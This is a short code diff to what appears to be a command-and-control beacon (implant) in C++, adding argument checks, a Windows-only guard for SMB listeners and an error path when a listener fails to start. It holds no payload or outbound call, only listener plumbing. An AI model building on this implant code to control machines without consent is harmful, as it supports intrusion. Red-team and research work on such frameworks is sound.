@@ -677,13 +677,17 @@ bool Beacon::handleListenerInstruction(C2Message& c2Message, C2Message& c2RetMes
     std::string delimiter = " ";
     splitList(cmd, delimiter, splitedCmd);
 
-    if (splitedCmd.empty())
+    if (splitedCmd.size() < 2)
         return false;
 
     if (splitedCmd[0] == StartCmd)
     {
         if (splitedCmd[1] == ListenerSmbType)
         {
+#ifndef _WIN32
+            c2RetMessage.set_errorCode(ERROR_UNSUPPORTED_PLATFORM);
+            return false;
+#else
             if (splitedCmd.size() != 4)
                 return false;
 
@@ -701,6 +705,11 @@ bool Beacon::handleListenerInstruction(C2Message& c2Message, C2Message& c2RetMes
             else
             {
                 auto listenerSmb = std::make_unique<ListenerSmb>(host, pipeName);
+                if (listenerSmb->init() <= 0)
+                {
+                    c2RetMessage.set_errorCode(ERROR_LISTENER_EXIST);
+                    return false;
+                }
                 std::string hash = listenerSmb->getListenerHash();
                 std::string metadata = listenerSmb->getListenerMetadata();
                 m_listeners.push_back(std::move(listenerSmb));
@@ -709,6 +718,7 @@ bool Beacon::handleListenerInstruction(C2Message& c2Message, C2Message& c2RetMes
                 c2RetMessage.set_returnvalue(hash);
                 return false;
             }
+#endif
         }
         else if (splitedCmd[1] == ListenerTcpType)
         {
